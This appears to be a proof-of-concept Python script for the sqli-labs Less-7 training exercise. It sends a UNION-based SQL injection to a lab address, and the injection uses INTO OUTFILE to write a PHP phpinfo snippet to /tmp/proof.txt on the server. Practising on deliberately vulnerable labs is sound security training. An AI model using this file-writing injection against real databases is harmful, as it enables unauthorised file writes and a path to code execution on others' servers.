#!/usr/bin/env python

import requests
import re
import string
import sys
import time
import urllib

banner = '''
USAGE: python %s <Message>

EXAMPLE: python %s "exploit!"
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

sourcestr = string.printable
url = "http://172.16.214.227/sqli-labs/Less-7/?id="
phpinfo = "<?php phpinfo(); ?>"

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "close",
}

query = urllib.quote("1')) union select 1,2,'%s' into outfile '/tmp/proof.txt';-- " % phpinfo)
target = url + query
print("[*] Query: %s" % query)
print("[*] Creating: %s" % "/tmp/proof.txt")
res = requests.get(target, headers=header, verify=False)

print("[*] SUCCESS?")
